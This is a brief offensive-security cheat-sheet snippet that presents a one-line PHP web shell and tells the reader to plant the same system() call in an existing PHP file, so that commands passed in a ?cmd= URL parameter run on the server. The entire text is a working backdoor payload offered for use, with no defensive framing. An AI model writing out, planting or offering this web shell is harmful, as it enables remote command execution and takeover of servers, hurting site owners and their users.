
Basic command injection just add `?cmd=COMMAND` to inject commands
```php
<?php system($_REQUEST['cmd']); ?>
```

Inject the following code in an existing PHP file to get the same effect:
```php
system($_GET['cmd']);
```